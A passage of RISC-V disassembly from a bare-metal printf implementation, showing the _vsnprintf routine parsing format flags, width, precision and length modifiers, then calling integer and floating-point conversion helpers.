    80005272:	fcf42023          	sw	a5,-64(s0)
    80005276:	fc042783          	lw	a5,-64(s0)
    8000527a:	2781                	sext.w	a5,a5
    8000527c:	0207d063          	bgez	a5,8000529c <_vsnprintf+0x1dc>
    80005280:	fec42783          	lw	a5,-20(s0)
    80005284:	0027e793          	ori	a5,a5,2
    80005288:	fef42623          	sw	a5,-20(s0)
    8000528c:	fc042783          	lw	a5,-64(s0)
    80005290:	40f007bb          	negw	a5,a5
    80005294:	2781                	sext.w	a5,a5
    80005296:	fef42423          	sw	a5,-24(s0)
    8000529a:	a029                	j	800052a4 <_vsnprintf+0x1e4>
    8000529c:	fc042783          	lw	a5,-64(s0)
    800052a0:	fef42423          	sw	a5,-24(s0)
    800052a4:	f8043783          	ld	a5,-128(s0)
    800052a8:	0785                	addi	a5,a5,1
    800052aa:	f8f43023          	sd	a5,-128(s0)
    800052ae:	fe042223          	sw	zero,-28(s0)
    800052b2:	f8043783          	ld	a5,-128(s0)
    800052b6:	0007c783          	lbu	a5,0(a5)
    800052ba:	873e                	mv	a4,a5
    800052bc:	02e00793          	li	a5,46
    800052c0:	06f71d63          	bne	a4,a5,8000533a <_vsnprintf+0x27a>
    800052c4:	fec42783          	lw	a5,-20(s0)
    800052c8:	4007e793          	ori	a5,a5,1024
    800052cc:	fef42623          	sw	a5,-20(s0)
    800052d0:	f8043783          	ld	a5,-128(s0)
    800052d4:	0785                	addi	a5,a5,1
    800052d6:	f8f43023          	sd	a5,-128(s0)
    800052da:	f8043783          	ld	a5,-128(s0)
    800052de:	0007c783          	lbu	a5,0(a5)
    800052e2:	853e                	mv	a0,a5
    800052e4:	d4ffe0ef          	jal	80004032 <_is_digit>
    800052e8:	87aa                	mv	a5,a0
    800052ea:	cb91                	beqz	a5,800052fe <_vsnprintf+0x23e>
    800052ec:	f8040793          	addi	a5,s0,-128
    800052f0:	853e                	mv	a0,a5
    800052f2:	d81fe0ef          	jal	80004072 <_atoi>
    800052f6:	87aa                	mv	a5,a0
    800052f8:	fef42223          	sw	a5,-28(s0)
    800052fc:	a83d                	j	8000533a <_vsnprintf+0x27a>
    800052fe:	f8043783          	ld	a5,-128(s0)
    80005302:	0007c783          	lbu	a5,0(a5)
    80005306:	873e                	mv	a4,a5
    80005308:	02a00793          	li	a5,42
    8000530c:	02f71763          	bne	a4,a5,8000533a <_vsnprintf+0x27a>
    80005310:	f7843783          	ld	a5,-136(s0)
    80005314:	00878713          	addi	a4,a5,8
    80005318:	f6e43c23          	sd	a4,-136(s0)
    8000531c:	439c                	lw	a5,0(a5)
    8000531e:	faf42e23          	sw	a5,-68(s0)
    80005322:	fbc42783          	lw	a5,-68(s0)
    80005326:	0a07e7b3          	max	a5,a5,zero
    8000532a:	2781                	sext.w	a5,a5
    8000532c:	fef42223          	sw	a5,-28(s0)
    80005330:	f8043783          	ld	a5,-128(s0)
    80005334:	0785                	addi	a5,a5,1
    80005336:	f8f43023          	sd	a5,-128(s0)
    8000533a:	f8043783          	ld	a5,-128(s0)
    8000533e:	0007c783          	lbu	a5,0(a5)
    80005342:	2781                	sext.w	a5,a5
    80005344:	f987869b          	addiw	a3,a5,-104
    80005348:	0006871b          	sext.w	a4,a3
    8000534c:	47c9                	li	a5,18
    8000534e:	0ee7e863          	bltu	a5,a4,8000543e <_vsnprintf+0x37e>
    80005352:	080687bb          	zext.w	a5,a3
    80005356:	00279713          	slli	a4,a5,0x2
    8000535a:	00002797          	auipc	a5,0x2
    8000535e:	aa278793          	addi	a5,a5,-1374 # 80006dfc <__am_mainargs+0x23f>
    80005362:	97ba                	add	a5,a5,a4
    80005364:	439c                	lw	a5,0(a5)
    80005366:	0007871b          	sext.w	a4,a5
    8000536a:	00002797          	auipc	a5,0x2
    8000536e:	a9278793          	addi	a5,a5,-1390 # 80006dfc <__am_mainargs+0x23f>
    80005372:	97ba                	add	a5,a5,a4
    80005374:	8782                	jr	a5
    80005376:	fec42783          	lw	a5,-20(s0)
    8000537a:	1007e793          	ori	a5,a5,256
    8000537e:	fef42623          	sw	a5,-20(s0)
    80005382:	f8043783          	ld	a5,-128(s0)
    80005386:	0785                	addi	a5,a5,1
    80005388:	f8f43023          	sd	a5,-128(s0)
    8000538c:	f8043783          	ld	a5,-128(s0)
    80005390:	0007c783          	lbu	a5,0(a5)
    80005394:	873e                	mv	a4,a5
    80005396:	06c00793          	li	a5,108
    8000539a:	0af71463          	bne	a4,a5,80005442 <_vsnprintf+0x382>
    8000539e:	fec42783          	lw	a5,-20(s0)
    800053a2:	2007e793          	ori	a5,a5,512
    800053a6:	fef42623          	sw	a5,-20(s0)
    800053aa:	f8043783          	ld	a5,-128(s0)
    800053ae:	0785                	addi	a5,a5,1
    800053b0:	f8f43023          	sd	a5,-128(s0)
    800053b4:	a079                	j	80005442 <_vsnprintf+0x382>
    800053b6:	fec42783          	lw	a5,-20(s0)
    800053ba:	0807e793          	ori	a5,a5,128
    800053be:	fef42623          	sw	a5,-20(s0)
    800053c2:	f8043783          	ld	a5,-128(s0)
    800053c6:	0785                	addi	a5,a5,1
    800053c8:	f8f43023          	sd	a5,-128(s0)
    800053cc:	f8043783          	ld	a5,-128(s0)
    800053d0:	0007c783          	lbu	a5,0(a5)
    800053d4:	873e                	mv	a4,a5
    800053d6:	06800793          	li	a5,104
    800053da:	06f71663          	bne	a4,a5,80005446 <_vsnprintf+0x386>
    800053de:	fec42783          	lw	a5,-20(s0)
    800053e2:	0407e793          	ori	a5,a5,64
    800053e6:	fef42623          	sw	a5,-20(s0)
    800053ea:	f8043783          	ld	a5,-128(s0)
    800053ee:	0785                	addi	a5,a5,1
    800053f0:	f8f43023          	sd	a5,-128(s0)
    800053f4:	a889                	j	80005446 <_vsnprintf+0x386>
    800053f6:	fec42783          	lw	a5,-20(s0)
    800053fa:	1007e793          	ori	a5,a5,256
    800053fe:	fef42623          	sw	a5,-20(s0)
    80005402:	f8043783          	ld	a5,-128(s0)
    80005406:	0785                	addi	a5,a5,1
    80005408:	f8f43023          	sd	a5,-128(s0)
    8000540c:	a835                	j	80005448 <_vsnprintf+0x388>
    8000540e:	fec42783          	lw	a5,-20(s0)
    80005412:	1007e793          	ori	a5,a5,256
    80005416:	fef42623          	sw	a5,-20(s0)
    8000541a:	f8043783          	ld	a5,-128(s0)
    8000541e:	0785                	addi	a5,a5,1
    80005420:	f8f43023          	sd	a5,-128(s0)
    80005424:	a015                	j	80005448 <_vsnprintf+0x388>
    80005426:	fec42783          	lw	a5,-20(s0)
    8000542a:	1007e793          	ori	a5,a5,256
    8000542e:	fef42623          	sw	a5,-20(s0)
    80005432:	f8043783          	ld	a5,-128(s0)
    80005436:	0785                	addi	a5,a5,1
    80005438:	f8f43023          	sd	a5,-128(s0)
    8000543c:	a031                	j	80005448 <_vsnprintf+0x388>
    8000543e:	0001                	nop
    80005440:	a021                	j	80005448 <_vsnprintf+0x388>
    80005442:	0001                	nop
    80005444:	a011                	j	80005448 <_vsnprintf+0x388>
    80005446:	0001                	nop
    80005448:	f8043783          	ld	a5,-128(s0)
    8000544c:	0007c783          	lbu	a5,0(a5)
    80005450:	2781                	sext.w	a5,a5
    80005452:	86be                	mv	a3,a5
    80005454:	06700713          	li	a4,103
    80005458:	08d74663          	blt	a4,a3,800054e4 <_vsnprintf+0x424>
    8000545c:	86be                	mv	a3,a5
    8000545e:	02500713          	li	a4,37
    80005462:	04e6d763          	bge	a3,a4,800054b0 <_vsnprintf+0x3f0>
    80005466:	02b0006f          	j	80005c90 <_vsnprintf+0xbd0>
    8000546a:	2781                	sext.w	a5,a5
    8000546c:	f977879b          	addiw	a5,a5,-105
    80005470:	2781                	sext.w	a5,a5
    80005472:	873e                	mv	a4,a5
    80005474:	4785                	li	a5,1
    80005476:	00e797b3          	sll	a5,a5,a4
    8000547a:	6725                	lui	a4,0x9
    8000547c:	04170713          	addi	a4,a4,65 # 9041 <i+0x9021>
    80005480:	8f7d                	and	a4,a4,a5
    80005482:	00e03733          	snez	a4,a4
    80005486:	0ff77713          	zext.b	a4,a4
    8000548a:	eb25                	bnez	a4,800054fa <_vsnprintf+0x43a>
    8000548c:	0807f713          	andi	a4,a5,128
    80005490:	00e03733          	snez	a4,a4
    80005494:	0ff77713          	zext.b	a4,a4
    80005498:	70071e63          	bnez	a4,80005bb4 <_vsnprintf+0xaf4>
    8000549c:	4007f793          	andi	a5,a5,1024
    800054a0:	00f037b3          	snez	a5,a5
    800054a4:	0ff7f793          	zext.b	a5,a5
    800054a8:	5c079e63          	bnez	a5,80005a84 <_vsnprintf+0x9c4>
    800054ac:	7e40006f          	j	80005c90 <_vsnprintf+0xbd0>
    800054b0:	fdb7869b          	addiw	a3,a5,-37
    800054b4:	0006871b          	sext.w	a4,a3
    800054b8:	04200793          	li	a5,66
    800054bc:	7ce7ea63          	bltu	a5,a4,80005c90 <_vsnprintf+0xbd0>
    800054c0:	080687bb          	zext.w	a5,a3
    800054c4:	00279713          	slli	a4,a5,0x2
    800054c8:	00002797          	auipc	a5,0x2
    800054cc:	98078793          	addi	a5,a5,-1664 # 80006e48 <__am_mainargs+0x28b>
    800054d0:	97ba                	add	a5,a5,a4
    800054d2:	439c                	lw	a5,0(a5)
    800054d4:	0007871b          	sext.w	a4,a5
    800054d8:	00002797          	auipc	a5,0x2
    800054dc:	97078793          	addi	a5,a5,-1680 # 80006e48 <__am_mainargs+0x28b>
    800054e0:	97ba                	add	a5,a5,a4
    800054e2:	8782                	jr	a5
    800054e4:	86be                	mv	a3,a5
    800054e6:	07800713          	li	a4,120
    800054ea:	7ad74363          	blt	a4,a3,80005c90 <_vsnprintf+0xbd0>
    800054ee:	86be                	mv	a3,a5
    800054f0:	06900713          	li	a4,105
    800054f4:	f6e6dbe3          	bge	a3,a4,8000546a <_vsnprintf+0x3aa>
    800054f8:	af61                	j	80005c90 <_vsnprintf+0xbd0>
    800054fa:	f8043783          	ld	a5,-128(s0)
    800054fe:	0007c783          	lbu	a5,0(a5)
    80005502:	873e                	mv	a4,a5
    80005504:	07800793          	li	a5,120
    80005508:	00f70b63          	beq	a4,a5,8000551e <_vsnprintf+0x45e>
    8000550c:	f8043783          	ld	a5,-128(s0)
    80005510:	0007c783          	lbu	a5,0(a5)
    80005514:	873e                	mv	a4,a5
    80005516:	05800793          	li	a5,88
    8000551a:	00f71663          	bne	a4,a5,80005526 <_vsnprintf+0x466>
    8000551e:	47c1                	li	a5,16
    80005520:	fcf42a23          	sw	a5,-44(s0)
    80005524:	a099                	j	8000556a <_vsnprintf+0x4aa>
    80005526:	f8043783          	ld	a5,-128(s0)
    8000552a:	0007c783          	lbu	a5,0(a5)
    8000552e:	873e                	mv	a4,a5
    80005530:	06f00793          	li	a5,111
    80005534:	00f71663          	bne	a4,a5,80005540 <_vsnprintf+0x480>
    80005538:	47a1                	li	a5,8
    8000553a:	fcf42a23          	sw	a5,-44(s0)
    8000553e:	a035                	j	8000556a <_vsnprintf+0x4aa>
    80005540:	f8043783          	ld	a5,-128(s0)
    80005544:	0007c783          	lbu	a5,0(a5)
    80005548:	873e                	mv	a4,a5
    8000554a:	06200793          	li	a5,98
    8000554e:	00f71663          	bne	a4,a5,8000555a <_vsnprintf+0x49a>
    80005552:	4789                	li	a5,2
    80005554:	fcf42a23          	sw	a5,-44(s0)
    80005558:	a809                	j	8000556a <_vsnprintf+0x4aa>
    8000555a:	47a9                	li	a5,10
    8000555c:	fcf42a23          	sw	a5,-44(s0)
    80005560:	fec42783          	lw	a5,-20(s0)
    80005564:	9bbd                	andi	a5,a5,-17
    80005566:	fef42623          	sw	a5,-20(s0)
    8000556a:	f8043783          	ld	a5,-128(s0)
    8000556e:	0007c783          	lbu	a5,0(a5)
    80005572:	873e                	mv	a4,a5
    80005574:	05800793          	li	a5,88
    80005578:	00f71863          	bne	a4,a5,80005588 <_vsnprintf+0x4c8>
    8000557c:	fec42783          	lw	a5,-20(s0)
    80005580:	0207e793          	ori	a5,a5,32
    80005584:	fef42623          	sw	a5,-20(s0)
    80005588:	f8043783          	ld	a5,-128(s0)
    8000558c:	0007c783          	lbu	a5,0(a5)
    80005590:	873e                	mv	a4,a5
    80005592:	06900793          	li	a5,105
    80005596:	02f70163          	beq	a4,a5,800055b8 <_vsnprintf+0x4f8>
    8000559a:	f8043783          	ld	a5,-128(s0)
    8000559e:	0007c783          	lbu	a5,0(a5)
    800055a2:	873e                	mv	a4,a5
    800055a4:	06400793          	li	a5,100
    800055a8:	00f70863          	beq	a4,a5,800055b8 <_vsnprintf+0x4f8>
    800055ac:	fec42783          	lw	a5,-20(s0)
    800055b0:	9bed                	andi	a5,a5,-5
    800055b2:	9bdd                	andi	a5,a5,-9
    800055b4:	fef42623          	sw	a5,-20(s0)
    800055b8:	fec42783          	lw	a5,-20(s0)
    800055bc:	4007f793          	andi	a5,a5,1024
    800055c0:	2781                	sext.w	a5,a5
    800055c2:	c791                	beqz	a5,800055ce <_vsnprintf+0x50e>
    800055c4:	fec42783          	lw	a5,-20(s0)
    800055c8:	9bf9                	andi	a5,a5,-2
    800055ca:	fef42623          	sw	a5,-20(s0)
    800055ce:	f8043783          	ld	a5,-128(s0)
    800055d2:	0007c783          	lbu	a5,0(a5)
    800055d6:	873e                	mv	a4,a5
    800055d8:	06900793          	li	a5,105
    800055dc:	00f70b63          	beq	a4,a5,800055f2 <_vsnprintf+0x532>
    800055e0:	f8043783          	ld	a5,-128(s0)
    800055e4:	0007c783          	lbu	a5,0(a5)
    800055e8:	873e                	mv	a4,a5
    800055ea:	06400793          	li	a5,100
    800055ee:	18f71963          	bne	a4,a5,80005780 <_vsnprintf+0x6c0>
    800055f2:	fec42783          	lw	a5,-20(s0)
    800055f6:	2007f793          	andi	a5,a5,512
    800055fa:	2781                	sext.w	a5,a5
    800055fc:	c3bd                	beqz	a5,80005662 <_vsnprintf+0x5a2>
    800055fe:	f7843783          	ld	a5,-136(s0)
    80005602:	00878713          	addi	a4,a5,8
    80005606:	f6e43c23          	sd	a4,-136(s0)
    8000560a:	639c                	ld	a5,0(a5)
    8000560c:	faf43023          	sd	a5,-96(s0)
    80005610:	fa043783          	ld	a5,-96(s0)
    80005614:	40f00733          	neg	a4,a5
    80005618:	fa043783          	ld	a5,-96(s0)
    8000561c:	0af767b3          	max	a5,a4,a5
    80005620:	85be                	mv	a1,a5
    80005622:	fa043783          	ld	a5,-96(s0)
    80005626:	93fd                	srli	a5,a5,0x3f
    80005628:	0ff7f713          	zext.b	a4,a5
    8000562c:	fd446683          	lwu	a3,-44(s0)
    80005630:	fe442603          	lw	a2,-28(s0)
    80005634:	fec42783          	lw	a5,-20(s0)
    80005638:	e43e                	sd	a5,8(sp)
    8000563a:	fe842783          	lw	a5,-24(s0)
    8000563e:	e03e                	sd	a5,0(sp)
    80005640:	88b2                	mv	a7,a2
    80005642:	8836                	mv	a6,a3
    80005644:	87ba                	mv	a5,a4
    80005646:	872e                	mv	a4,a1
    80005648:	f8843683          	ld	a3,-120(s0)
    8000564c:	fd843603          	ld	a2,-40(s0)
    80005650:	f9043583          	ld	a1,-112(s0)
    80005654:	f9843503          	ld	a0,-104(s0)
    80005658:	f49fe0ef          	jal	800045a0 <_ntoa_long_long>
    8000565c:	fca43c23          	sd	a0,-40(s0)
    80005660:	a4a9                	j	800058aa <_vsnprintf+0x7ea>
    80005662:	fec42783          	lw	a5,-20(s0)
    80005666:	1007f793          	andi	a5,a5,256
    8000566a:	2781                	sext.w	a5,a5
    8000566c:	c3bd                	beqz	a5,800056d2 <_vsnprintf+0x612>
    8000566e:	f7843783          	ld	a5,-136(s0)
    80005672:	00878713          	addi	a4,a5,8
    80005676:	f6e43c23          	sd	a4,-136(s0)
    8000567a:	639c                	ld	a5,0(a5)
    8000567c:	faf43423          	sd	a5,-88(s0)
    80005680:	fa843783          	ld	a5,-88(s0)
    80005684:	40f00733          	neg	a4,a5
    80005688:	fa843783          	ld	a5,-88(s0)
    8000568c:	0af767b3          	max	a5,a4,a5
    80005690:	85be                	mv	a1,a5
    80005692:	fa843783          	ld	a5,-88(s0)
    80005696:	93fd                	srli	a5,a5,0x3f
    80005698:	0ff7f713          	zext.b	a4,a5
    8000569c:	fd446683          	lwu	a3,-44(s0)
    800056a0:	fe442603          	lw	a2,-28(s0)
    800056a4:	fec42783          	lw	a5,-20(s0)
    800056a8:	e43e                	sd	a5,8(sp)
    800056aa:	fe842783          	lw	a5,-24(s0)
    800056ae:	e03e                	sd	a5,0(sp)
    800056b0:	88b2                	mv	a7,a2
    800056b2:	8836                	mv	a6,a3
    800056b4:	87ba                	mv	a5,a4
    800056b6:	872e                	mv	a4,a1
    800056b8:	f8843683          	ld	a3,-120(s0)
    800056bc:	fd843603          	ld	a2,-40(s0)
    800056c0:	f9043583          	ld	a1,-112(s0)
    800056c4:	f9843503          	ld	a0,-104(s0)
    800056c8:	dc3fe0ef          	jal	8000448a <_ntoa_long>
    800056cc:	fca43c23          	sd	a0,-40(s0)
    800056d0:	aae9                	j	800058aa <_vsnprintf+0x7ea>
    800056d2:	fec42783          	lw	a5,-20(s0)
    800056d6:	0407f793          	andi	a5,a5,64
    800056da:	2781                	sext.w	a5,a5
    800056dc:	cf81                	beqz	a5,800056f4 <_vsnprintf+0x634>
    800056de:	f7843783          	ld	a5,-136(s0)
    800056e2:	00878713          	addi	a4,a5,8
    800056e6:	f6e43c23          	sd	a4,-136(s0)
    800056ea:	439c                	lw	a5,0(a5)
    800056ec:	0ff7f793          	zext.b	a5,a5
    800056f0:	2781                	sext.w	a5,a5
    800056f2:	a805                	j	80005722 <_vsnprintf+0x662>
    800056f4:	fec42783          	lw	a5,-20(s0)
    800056f8:	0807f793          	andi	a5,a5,128
    800056fc:	2781                	sext.w	a5,a5
    800056fe:	cb99                	beqz	a5,80005714 <_vsnprintf+0x654>
    80005700:	f7843783          	ld	a5,-136(s0)
    80005704:	00878713          	addi	a4,a5,8
    80005708:	f6e43c23          	sd	a4,-136(s0)
    8000570c:	439c                	lw	a5,0(a5)
    8000570e:	60579793          	sext.h	a5,a5
    80005712:	a801                	j	80005722 <_vsnprintf+0x662>
    80005714:	f7843783          	ld	a5,-136(s0)
    80005718:	00878713          	addi	a4,a5,8
    8000571c:	f6e43c23          	sd	a4,-136(s0)
    80005720:	439c                	lw	a5,0(a5)
    80005722:	faf42823          	sw	a5,-80(s0)
    80005726:	fb042783          	lw	a5,-80(s0)
    8000572a:	41f7d79b          	sraiw	a5,a5,0x1f
    8000572e:	fb042703          	lw	a4,-80(s0)
    80005732:	8f3d                	xor	a4,a4,a5
    80005734:	40f707bb          	subw	a5,a4,a5
    80005738:	2781                	sext.w	a5,a5
    8000573a:	2781                	sext.w	a5,a5
    8000573c:	0807873b          	zext.w	a4,a5
    80005740:	fb042783          	lw	a5,-80(s0)
    80005744:	01f7d79b          	srliw	a5,a5,0x1f
    80005748:	0ff7f693          	zext.b	a3,a5
    8000574c:	fd446603          	lwu	a2,-44(s0)
    80005750:	fe442583          	lw	a1,-28(s0)
    80005754:	fec42783          	lw	a5,-20(s0)
    80005758:	e43e                	sd	a5,8(sp)
    8000575a:	fe842783          	lw	a5,-24(s0)
    8000575e:	e03e                	sd	a5,0(sp)
    80005760:	88ae                	mv	a7,a1
    80005762:	8832                	mv	a6,a2
    80005764:	87b6                	mv	a5,a3
    80005766:	f8843683          	ld	a3,-120(s0)
    8000576a:	fd843603          	ld	a2,-40(s0)
    8000576e:	f9043583          	ld	a1,-112(s0)
    80005772:	f9843503          	ld	a0,-104(s0)
    80005776:	d15fe0ef          	jal	8000448a <_ntoa_long>
    8000577a:	fca43c23          	sd	a0,-40(s0)
    8000577e:	a235                	j	800058aa <_vsnprintf+0x7ea>
    80005780:	fec42783          	lw	a5,-20(s0)
    80005784:	2007f793          	andi	a5,a5,512
    80005788:	2781                	sext.w	a5,a5
    8000578a:	c3b1                	beqz	a5,800057ce <_vsnprintf+0x70e>
    8000578c:	f7843783          	ld	a5,-136(s0)
    80005790:	00878713          	addi	a4,a5,8
    80005794:	f6e43c23          	sd	a4,-136(s0)
    80005798:	6398                	ld	a4,0(a5)
    8000579a:	fd446683          	lwu	a3,-44(s0)
    8000579e:	fe442603          	lw	a2,-28(s0)
    800057a2:	fec42783          	lw	a5,-20(s0)
    800057a6:	e43e                	sd	a5,8(sp)
    800057a8:	fe842783          	lw	a5,-24(s0)
    800057ac:	e03e                	sd	a5,0(sp)
    800057ae:	88b2                	mv	a7,a2
    800057b0:	8836                	mv	a6,a3
    800057b2:	4781                	li	a5,0
    800057b4:	f8843683          	ld	a3,-120(s0)
    800057b8:	fd843603          	ld	a2,-40(s0)
    800057bc:	f9043583          	ld	a1,-112(s0)
    800057c0:	f9843503          	ld	a0,-104(s0)
    800057c4:	dddfe0ef          	jal	800045a0 <_ntoa_long_long>
    800057c8:	fca43c23          	sd	a0,-40(s0)
    800057cc:	a8f9                	j	800058aa <_vsnprintf+0x7ea>
    800057ce:	fec42783          	lw	a5,-20(s0)
    800057d2:	1007f793          	andi	a5,a5,256
    800057d6:	2781                	sext.w	a5,a5
    800057d8:	c3b1                	beqz	a5,8000581c <_vsnprintf+0x75c>
    800057da:	f7843783          	ld	a5,-136(s0)
    800057de:	00878713          	addi	a4,a5,8
    800057e2:	f6e43c23          	sd	a4,-136(s0)
    800057e6:	6398                	ld	a4,0(a5)
    800057e8:	fd446683          	lwu	a3,-44(s0)
    800057ec:	fe442603          	lw	a2,-28(s0)
    800057f0:	fec42783          	lw	a5,-20(s0)
    800057f4:	e43e                	sd	a5,8(sp)
    800057f6:	fe842783          	lw	a5,-24(s0)
    800057fa:	e03e                	sd	a5,0(sp)
    800057fc:	88b2                	mv	a7,a2
    800057fe:	8836                	mv	a6,a3
    80005800:	4781                	li	a5,0
    80005802:	f8843683          	ld	a3,-120(s0)
    80005806:	fd843603          	ld	a2,-40(s0)
    8000580a:	f9043583          	ld	a1,-112(s0)
    8000580e:	f9843503          	ld	a0,-104(s0)
    80005812:	c79fe0ef          	jal	8000448a <_ntoa_long>
    80005816:	fca43c23          	sd	a0,-40(s0)
    8000581a:	a841                	j	800058aa <_vsnprintf+0x7ea>
    8000581c:	fec42783          	lw	a5,-20(s0)
    80005820:	0407f793          	andi	a5,a5,64
    80005824:	2781                	sext.w	a5,a5
    80005826:	cf81                	beqz	a5,8000583e <_vsnprintf+0x77e>
    80005828:	f7843783          	ld	a5,-136(s0)
    8000582c:	00878713          	addi	a4,a5,8
    80005830:	f6e43c23          	sd	a4,-136(s0)
    80005834:	439c                	lw	a5,0(a5)
    80005836:	0ff7f793          	zext.b	a5,a5
    8000583a:	2781                	sext.w	a5,a5
    8000583c:	a815                	j	80005870 <_vsnprintf+0x7b0>
    8000583e:	fec42783          	lw	a5,-20(s0)
    80005842:	0807f793          	andi	a5,a5,128
    80005846:	2781                	sext.w	a5,a5
    80005848:	cf81                	beqz	a5,80005860 <_vsnprintf+0x7a0>
    8000584a:	f7843783          	ld	a5,-136(s0)
    8000584e:	00878713          	addi	a4,a5,8
    80005852:	f6e43c23          	sd	a4,-136(s0)
    80005856:	439c                	lw	a5,0(a5)
    80005858:	0807c7bb          	zext.h	a5,a5
    8000585c:	2781                	sext.w	a5,a5
    8000585e:	a801                	j	8000586e <_vsnprintf+0x7ae>
    80005860:	f7843783          	ld	a5,-136(s0)
    80005864:	00878713          	addi	a4,a5,8
    80005868:	f6e43c23          	sd	a4,-136(s0)
    8000586c:	439c                	lw	a5,0(a5)
    8000586e:	2781                	sext.w	a5,a5
    80005870:	faf42a23          	sw	a5,-76(s0)
    80005874:	fb446703          	lwu	a4,-76(s0)
    80005878:	fd446683          	lwu	a3,-44(s0)
    8000587c:	fe442603          	lw	a2,-28(s0)
    80005880:	fec42783          	lw	a5,-20(s0)
    80005884:	e43e                	sd	a5,8(sp)
    80005886:	fe842783          	lw	a5,-24(s0)
    8000588a:	e03e                	sd	a5,0(sp)
    8000588c:	88b2                	mv	a7,a2
    8000588e:	8836                	mv	a6,a3
    80005890:	4781                	li	a5,0
    80005892:	f8843683          	ld	a3,-120(s0)
    80005896:	fd843603          	ld	a2,-40(s0)
    8000589a:	f9043583          	ld	a1,-112(s0)
    8000589e:	f9843503          	ld	a0,-104(s0)
    800058a2:	be9fe0ef          	jal	8000448a <_ntoa_long>
    800058a6:	fca43c23          	sd	a0,-40(s0)
    800058aa:	f8043783          	ld	a5,-128(s0)
    800058ae:	0785                	addi	a5,a5,1
    800058b0:	f8f43023          	sd	a5,-128(s0)
    800058b4:	a131                	j	80005cc0 <_vsnprintf+0xc00>
    800058b6:	f8043783          	ld	a5,-128(s0)
    800058ba:	0007c783          	lbu	a5,0(a5)
    800058be:	873e                	mv	a4,a5
    800058c0:	04600793          	li	a5,70
    800058c4:	00f71863          	bne	a4,a5,800058d4 <_vsnprintf+0x814>
    800058c8:	fec42783          	lw	a5,-20(s0)
    800058cc:	0207e793          	ori	a5,a5,32
    800058d0:	fef42623          	sw	a5,-20(s0)
    800058d4:	f7843783          	ld	a5,-136(s0)
    800058d8:	00878713          	addi	a4,a5,8
    800058dc:	f6e43c23          	sd	a4,-136(s0)
    800058e0:	239c                	fld	fa5,0(a5)
    800058e2:	fec42683          	lw	a3,-20(s0)
    800058e6:	fe842783          	lw	a5,-24(s0)
    800058ea:	fe442703          	lw	a4,-28(s0)
    800058ee:	8836                	mv	a6,a3
    800058f0:	22f78553          	fmv.d	fa0,fa5
    800058f4:	f8843683          	ld	a3,-120(s0)
    800058f8:	fd843603          	ld	a2,-40(s0)
    800058fc:	f9043583          	ld	a1,-112(s0)
    80005900:	f9843503          	ld	a0,-104(s0)
    80005904:	db3fe0ef          	jal	800046b6 <_ftoa>
    80005908:	fca43c23          	sd	a0,-40(s0)
    8000590c:	f8043783          	ld	a5,-128(s0)
    80005910:	0785                	addi	a5,a5,1
    80005912:	f8f43023          	sd	a5,-128(s0)
    80005916:	a66d                	j	80005cc0 <_vsnprintf+0xc00>
    80005918:	f8043783          	ld	a5,-128(s0)
    8000591c:	0007c783          	lbu	a5,0(a5)
    80005920:	873e                	mv	a4,a5
    80005922:	06700793          	li	a5,103
    80005926:	00f70b63          	beq	a4,a5,8000593c <_vsnprintf+0x87c>
    8000592a:	f8043783          	ld	a5,-128(s0)
    8000592e:	0007c783          	lbu	a5,0(a5)
    80005932:	873e                	mv	a4,a5
    80005934:	04700793          	li	a5,71
    80005938:	00f71a63          	bne	a4,a5,8000594c <_vsnprintf+0x88c>
    8000593c:	fec42783          	lw	a5,-20(s0)
    80005940:	873e                	mv	a4,a5
    80005942:	28b01793          	bseti	a5,zero,0xb
    80005946:	8fd9                	or	a5,a5,a4
    80005948:	fef42623          	sw	a5,-20(s0)
    8000594c:	f8043783          	ld	a5,-128(s0)
    80005950:	0007c783          	lbu	a5,0(a5)
    80005954:	873e                	mv	a4,a5
    80005956:	04500793          	li	a5,69
    8000595a:	00f70b63          	beq	a4,a5,80005970 <_vsnprintf+0x8b0>
    8000595e:	f8043783          	ld	a5,-128(s0)
    80005962:	0007c783          	lbu	a5,0(a5)
    80005966:	873e                	mv	a4,a5
    80005968:	04700793          	li	a5,71
    8000596c:	00f71863          	bne	a4,a5,8000597c <_vsnprintf+0x8bc>
    80005970:	fec42783          	lw	a5,-20(s0)
    80005974:	0207e793          	ori	a5,a5,32
    80005978:	fef42623          	sw	a5,-20(s0)
    8000597c:	f7843783          	ld	a5,-136(s0)
    80005980:	00878713          	addi	a4,a5,8
    80005984:	f6e43c23          	sd	a4,-136(s0)
    80005988:	239c                	fld	fa5,0(a5)
    8000598a:	fec42683          	lw	a3,-20(s0)
    8000598e:	fe842783          	lw	a5,-24(s0)
    80005992:	fe442703          	lw	a4,-28(s0)
    80005996:	8836                	mv	a6,a3
    80005998:	22f78553          	fmv.d	fa0,fa5
    8000599c:	f8843683          	ld	a3,-120(s0)
    800059a0:	fd843603          	ld	a2,-40(s0)
    800059a4:	f9043583          	ld	a1,-112(s0)
    800059a8:	f9843503          	ld	a0,-104(s0)
    800059ac:	a4cff0ef          	jal	80004bf8 <_etoa>
    800059b0:	fca43c23          	sd	a0,-40(s0)
    800059b4:	f8043783          	ld	a5,-128(s0)
    800059b8:	0785                	addi	a5,a5,1
    800059ba:	f8f43023          	sd	a5,-128(s0)
    800059be:	a609                	j	80005cc0 <_vsnprintf+0xc00>
    800059c0:	4785                	li	a5,1
    800059c2:	fcf42823          	sw	a5,-48(s0)
    800059c6:	fec42783          	lw	a5,-20(s0)
    800059ca:	8b89                	andi	a5,a5,2
    800059cc:	2781                	sext.w	a5,a5
    800059ce:	ef8d                	bnez	a5,80005a08 <_vsnprintf+0x948>
    800059d0:	a00d                	j	800059f2 <_vsnprintf+0x932>
    800059d2:	fd843783          	ld	a5,-40(s0)
    800059d6:	00178713          	addi	a4,a5,1
    800059da:	fce43c23          	sd	a4,-40(s0)
    800059de:	f9843703          	ld	a4,-104(s0)
    800059e2:	f8843683          	ld	a3,-120(s0)
    800059e6:	863e                	mv	a2,a5
    800059e8:	f9043583          	ld	a1,-112(s0)
    800059ec:	02000513          	li	a0,32
    800059f0:	9702                	jalr	a4
    800059f2:	fd042783          	lw	a5,-48(s0)
    800059f6:	0017871b          	addiw	a4,a5,1
    800059fa:	fce42823          	sw	a4,-48(s0)
    800059fe:	fe842703          	lw	a4,-24(s0)
    80005a02:	2701                	sext.w	a4,a4
    80005a04:	fce7e7e3          	bltu	a5,a4,800059d2 <_vsnprintf+0x912>
    80005a08:	f7843783          	ld	a5,-136(s0)
    80005a0c:	00878713          	addi	a4,a5,8
    80005a10:	f6e43c23          	sd	a4,-136(s0)
    80005a14:	439c                	lw	a5,0(a5)
    80005a16:	0ff7f513          	zext.b	a0,a5
    80005a1a:	fd843783          	ld	a5,-40(s0)
